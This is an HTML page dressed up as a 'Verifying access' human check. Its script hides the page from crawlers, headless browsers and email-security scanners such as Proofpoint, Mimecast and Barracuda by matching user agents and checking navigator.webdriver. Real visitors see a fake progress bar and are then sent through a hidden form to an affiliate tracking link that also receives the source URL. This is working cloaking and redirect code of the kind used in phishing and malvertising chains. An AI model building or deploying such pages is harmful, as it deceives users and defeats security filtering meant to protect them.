<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<meta name="robots" content="noindex,nofollow,noarchive,nosnippet">
<meta http-equiv="Cache-Control" content="no-store">
<meta name="referrer" content="strict-origin-when-cross-origin">
<title>Please wait</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
  html,body{height:100%}
  body{
    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
    background:linear-gradient(180deg,#f8fbff,#e8f1ff 60%,#d8e7ff);
    color:#0d2347;display:flex;align-items:center;justify-content:center;
    min-height:100dvh;padding:24px;overflow:hidden;
  }
  .panel{
    width:100%;max-width:400px;background:#fff;border-radius:20px;
    padding:36px 28px 26px;text-align:center;
    box-shadow:0 20px 50px rgba(13,35,71,.12),0 0 0 1px #e4edff;
  }
  .icon-wrap{
    width:68px;height:68px;margin:0 auto 16px;border-radius:20px;
    background:linear-gradient(135deg,#1e40af,#3b82f6);
    display:flex;align-items:center;justify-content:center;
    font-size:32px;color:#fff;box-shadow:0 10px 26px rgba(30,64,175,.28);
  }
  .h{font-size:20px;font-weight:700;margin-bottom:6px;color:#0d2347}
  .sub{font-size:13.5px;color:#5b7196;line-height:1.5;margin-bottom:24px}
  .bar-wrap{height:6px;background:#eef4ff;border-radius:99px;overflow:hidden;margin-bottom:10px}
  .bar{height:100%;width:0;background:linear-gradient(90deg,#1e40af,#60a5fa);transition:width .3s linear;border-radius:99px}
  .msg{font-size:12.5px;color:#5b7196;min-height:18px}
  .cta{
    display:none;width:100%;margin-top:22px;padding:15px;border:0;
    border-radius:12px;background:#1e40af;color:#fff;
    font-family:inherit;font-size:15px;font-weight:600;cursor:pointer;
    min-height:52px;letter-spacing:.3px;transition:background .15s;
  }
  .cta:hover{background:#1e3a8a}
  .cta:active{transform:scale(.985)}
  .cta.ready{display:block;animation:in .3s ease}
  @keyframes in{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}}
</style>
</head>
<body>
<main class="panel">
  <div class="icon-wrap">🛡</div>
  <h1 class="h">Verifying access</h1>
  <p class="sub">Checking that you're a real user.<br>Almost finished.</p>
  <div class="bar-wrap"><div class="bar" id="prog1"></div></div>
  <div class="msg" id="msg1">Loading…</div>
  <button class="cta" id="next1" type="button">Proceed →</button>
</main>
<script>
(function(){
  var DEST="https://trc.beastbox.pro/click?o=cmvta9nzp000caetjlw6ebg6r&p=AF-1004&sub1=RS";
  var PARAM="referrerCF";
  var b=document.getElementById("prog1"),m=document.getElementById("msg1"),k=document.getElementById("next1");
  var s=navigator.userAgent||"";
  var bad=[/bot\b/i,/crawler/i,/spider/i,/curl\//i,/wget\//i,/python-requests/i,/headlesschrome/i,/phantomjs/i,/googlebot/i,/bingpreview/i,/yandexbot/i,/duckduckbot/i,/facebookexternalhit/i,/telegrambot/i,/googleimageproxy/i,/yahoomailproxy/i,/ms-office/i,/microsoft office/i,/barracuda/i,/proofpoint/i,/mimecast/i];
  for(var i=0;i<bad.length;i++){if(bad[i].test(s))return;}
  if(navigator.webdriver===true)return;
  var touched=0;
  ["pointerdown","touchstart","mousemove","keydown","scroll"].forEach(function(ev){
    window.addEventListener(ev,function(){touched=1},{passive:true});
  });
  var dur=1400+Math.random()*1100;
  var t0=performance.now();
  var done=0;
  function frame(){
    var now=performance.now(),pct=Math.min(100,(now-t0)/dur*100);
    b.style.width=pct+"%";
    if(now-t0<dur){requestAnimationFrame(frame);return;}
    if(done)return;done=1;
    b.style.width="100%";
    m.textContent=touched?"Verified ✓":"Tap to continue";
    k.className="cta ready";
  }
  requestAnimationFrame(frame);
  function navigate(){
    var f=document.createElement("form");
    f.method="GET";f.action=DEST;f.style.display="none";
    var hidden=document.createElement("input");
    hidden.type="hidden";hidden.name=PARAM;hidden.value=location.href;
    f.appendChild(hidden);document.body.appendChild(f);
    try{f.submit();}catch(e){window.location.href=DEST+"&"+PARAM+"="+encodeURIComponent(location.href);}
  }
  var fired=0;
  k.addEventListener("click",function(e){
    e.preventDefault();if(fired)return;fired=1;
    k.disabled=true;k.style.opacity=".6";m.textContent="Redirecting…";navigate();
  });
})();
</script>
</body>
</html>
